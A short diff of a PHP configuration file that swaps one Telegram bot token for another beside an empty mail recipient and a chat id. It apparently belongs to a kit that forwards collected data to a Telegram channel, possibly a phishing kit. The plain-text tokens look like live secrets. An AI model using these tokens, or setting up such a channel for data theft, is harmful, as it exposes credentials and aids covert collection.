@@ -4,6 +4,6 @@
 $to = "";
 
 // INFO TELEGRAM
-$token = "8543168325:AAHGS6d91NeU-RPi9LkaQ6a6jFPFyBsTxcU";
+$token = "8499986181:AAHcur9RXlDhRrDx3SGT3YYdKaF2X2svPDI";
 $chat_id = "1733772870";
 ?>
